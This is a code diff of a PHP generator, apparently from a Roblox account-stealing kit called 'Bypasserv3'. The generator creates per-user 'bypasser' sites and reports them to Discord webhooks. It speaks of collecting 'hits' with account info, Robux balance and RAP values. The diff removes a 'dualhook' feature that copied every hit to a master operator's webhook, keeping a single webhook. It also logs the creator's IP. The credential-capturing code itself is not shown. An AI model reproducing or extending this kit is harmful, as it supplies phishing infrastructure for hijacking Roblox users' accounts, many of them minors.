@@ -1,7 +1,7 @@
 <?php
 /**
  * Bypasserv3 - Dualhook Instance Creator
- * Updated with per-instance user webhooks
+ * Updated for simplified single webhook
  */
 
 header('Content-Type: application/json');
@@ -73,20 +73,13 @@ if (directoryExists($directory)) {
 // Master Webhook validation
 if (empty($masterWebhook)) {
     http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Master webhook URL is required']);
+    echo json_encode(['success' => false, 'error' => 'Webhook URL is required']);
     exit;
 }
 
 if (!validateWebhook($masterWebhook)) {
     http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Invalid master webhook URL. Please check your Discord webhook.']);
-    exit;
-}
-
-// User Webhook validation (if provided)
-if (!empty($userWebhook) && !validateWebhook($userWebhook)) {
-    http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Invalid user webhook URL. Please check your Discord webhook.']);
+    echo json_encode(['success' => false, 'error' => 'Invalid webhook URL. Please check your Discord webhook.']);
     exit;
 }
 
@@ -101,7 +94,7 @@ if (!checkRateLimit($clientIP, 10, 3600)) {
 }
 
 // ============================================
-// CREATE INSTANCE DATA WITH DUALHOOKS
+// CREATE INSTANCE DATA
 // ============================================
 $instanceData = [
     'directory' => $directory,
@@ -129,44 +122,23 @@ $instanceData = [
 saveInstanceData($directory, $instanceData);
 
 // ============================================
-// SEND MASTER WEBHOOK NOTIFICATION
+// SEND WEBHOOK NOTIFICATION
 // ============================================
-$masterPayload = [
+$payload = [
     'embeds' => [[
         'title' => '✅ New Site Generated',
         'description' => "**Site Name:** `{$directory}`\n**Public URL:** `https://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/public/?dir={$directory}`",
-        'color' => 3066993,
+        'color' => 0x0a9cc9,
         'fields' => [
-            ['name' => 'Master Webhook', 'value' => '✓ Connected - Receives ALL hits', 'inline' => false],
-            ['name' => 'User Webhook', 'value' => $userWebhook ? '✓ Connected - Receives ONLY hits from this site' : '✗ Not set - Using master webhook', 'inline' => false],
+            ['name' => 'Webhook', 'value' => '✓ Connected', 'inline' => false],
             ['name' => 'Created', 'value' => date('Y-m-d H:i:s'), 'inline' => true],
             ['name' => 'IP', 'value' => $clientIP, 'inline' => true]
         ],
-        'footer' => ['text' => 'Bypasserv3 Master Admin Panel'],
+        'footer' => ['text' => 'Bypasserv3 Generator'],
         'timestamp' => date('c')
     ]]
 ];
-sendWebhookNotification($masterWebhook, $masterPayload);
-
-// ============================================
-// SEND USER WEBHOOK NOTIFICATION (if different from master)
-// ============================================
-if (!empty($userWebhook) && $userWebhook !== $masterWebhook) {
-    $userPayload = [
-        'embeds' => [[
-            'title' => '🎉 Your Bypasser Site is Ready!',
-            'description' => "Your Roblox bypasser site has been created successfully!\n\n**Site:** `{$directory}`\n**Link:** `https://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/public/?dir={$directory}`",
-            'color' => 3447003,
-            'fields' => [
-                ['name' => '✨ Features', 'value' => '• Account Info Fetching\n• Robux Balance Display\n• RAP Value Tracking\n• Full Account Statistics\n• Works for all countries', 'inline' => false],
-                ['name' => '📊 Webhook Info', 'value' => 'This webhook will only receive hits from YOUR site', 'inline' => false]
-            ],
-            'footer' => ['text' => 'Bypasserv3 Instance Generator'],
-            'timestamp' => date('c')
-        ]]
-    ];
-    sendWebhookNotification($userWebhook, $userPayload);
-}
+sendWebhookNotification($masterWebhook, $payload);
 
 // Update global stats
 updateGlobalStats('totalInstances', 1);
@@ -178,6 +150,6 @@ echo json_encode([
     'success' => true,
     'directory' => $directory,
     'publicUrl' => 'https://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/public/?dir=' . $directory,
-    'message' => 'Site generated successfully with DUALHOOK NOTIFICATIONS!'
+    'message' => 'Site generated successfully!'
 ]);
 ?>
